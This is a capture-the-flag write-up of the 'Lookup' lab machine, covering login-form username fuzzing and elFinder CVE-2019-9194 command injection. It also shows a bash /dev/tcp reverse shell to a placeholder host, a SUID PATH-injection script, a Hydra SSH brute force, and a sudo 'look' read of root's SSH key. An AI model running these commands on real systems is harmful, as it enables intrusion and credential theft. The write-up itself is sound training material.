---
title: Lookup
difficulty: Easy
environment: Linux & Web
tags:
  - ffuf
  - Enumeration
  - Subdomain
  - elFinder
  - CVE-2019-9194
  - RCE
  - SUID
  - PATH Injection
  - sudo
  - GTFOBins
  - Linux
  - Web
image: "https://cards.scryfall.io/art_crop/front/0/c/0c18c541-758b-4237-9961-9637e996e8a5.jpg?1592516836"
image_alt: "Finishing Blow art"
date: 2026-02-21
---

## Overview

Lookup is an easy boot-to-root that rewards careful web enumeration. The chain is: username enumeration on a login form → pivot to a hidden file-manager subdomain → elFinder 2.1.47 command injection to get a shell → abuse of a misconfigured SUID binary for horizontal escalation → root via a passwordless `sudo` rule for `look`.

## Reconnaissance

### Nmap Scan

```
$ nmap -p- --min-rate 1000 -Pn 10.10.11.xx
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

```
$ nmap -sCV -p 22,80 -oN nmap/lookup 10.10.11.xx
```

HTTP redirects to `http://lookup.thm/`, so I added the host entry and browsed the site.

Example hosts entry:

```text
10.10.11.xx lookup.thm
```

### Web Application

The main site presents a login form. Testing random usernames/passwords shows the application leaks information via its error responses (valid user vs invalid user vs invalid password), which makes it a good target for form fuzzing.

## Exploitation

### Username Enumeration (FFUF)

I fuzzed the login form and watched response characteristics (status code / size) to identify valid usernames.

Example (username fuzz):

```bash
ffuf -u http://lookup.thm/login.php \
  -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt \
  -X POST \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'username=FUZZ&password=invalid' \
  -fc 200
```

One username stood out as behaving differently (different response length / different failure message). In this case, `admin` was a valid username.

From there I tried password fuzzing for the known-valid user. A single password candidate produced a noticeably different response compared to the rest (a strong hint that it’s relevant), but `admin:<candidate>` still did not log in.

Instead of stopping there, I re-ran username fuzzing while keeping that candidate password fixed. That revealed a second username that actually authenticated successfully:

- `jose` / `password123`

### Login Pivot to the Files Subdomain

From here, the successful login path ultimately redirects to a second host:

- `files.lookup.thm`

So I added it to my hosts file as well:

```text
10.10.11.xx files.lookup.thm
```

Browsing `files.lookup.thm` exposes an elFinder instance.

### elFinder RCE (CVE-2019-9194)

In the elFinder “About” page, the version is `2.1.47`, which is vulnerable to a command injection that can be triggered through image processing actions (e.g., rotate/resize).

High-level approach:

1. Upload a benign image.
2. Rename it to a filename that injects a shell command to write a small PHP webshell file.
3. Trigger an image action (rotate/resize) so the backend executes the injected filename.
4. Hit the newly written PHP file with a query parameter to run commands, then pop a reverse shell.

Once code execution is working, I switched to a reverse shell.

Example reverse shell payload:

```text
bash -c 'bash -i >& /dev/tcp/<YOUR_IP>/<YOUR_PORT> 0>&1'
```

### Horizontal Privilege Escalation (SUID `pwm` + PATH Injection)

From the `www-data` shell, I found a SUID binary:

- `/usr/sbin/pwm`

It invokes common utilities (like `id`) and attempts to read a `.passwords` file but looks in the wrong place. By placing a fake `id` earlier in `PATH`, I could influence what `pwm` sees and coax it into revealing the password list.

In practice, the trick is that `pwm` appears to call `id` without an absolute path and then makes decisions based on its output. By writing our own `id` script into `/tmp` and prepending `/tmp` to `PATH`, `pwm` will execute our script, which prints an `id`-style line containing `(think)`.

Highlights: SUID bit file pwn

```text
echo '#!/bin/bash' > /tmp/id
echo 'echo "uid=33(think) gid=33(think) groups=(think)"' >> /tmp/id
chmod +x /tmp/id
export PATH=/tmp:$PATH
/usr/sbin/pwm
```

After that, I collected the leaked passwords into a wordlist and brute-forced SSH for the `think` user.

Example:

```bash
hydra -l think -P passwords.txt ssh://lookup.thm
```

### Root (Sudo `look` via GTFOBins)

As `think`, `sudo -l` shows a passwordless rule allowing `look` as root.

Because `look` can read arbitrary files (GTFOBins), I used it to dump root-only files.

Highlights: Sudo `look` to extract SSH private key

```bash
LFILE=/root/.ssh/id_rsa
sudo /usr/bin/look '' "$LFILE"
```

Copy the key locally, lock permissions, and SSH in:

```bash
chmod 600 id_rsa
ssh -i id_rsa root@lookup.thm
```

## Flags

- **User:** `xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx`
- **Root:** `xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx`

## Lessons Learned

- Authentication endpoints should not leak user validity through error messages or response size.
- Keep file-manager components patched; don’t expose them on public subdomains.
- Avoid risky server-side shell-outs for file transformations.
- SUID binaries should not trust `PATH` and should use absolute paths for helpers.
- Minimize `sudo` rules and audit them against GTFOBins-style file reads.
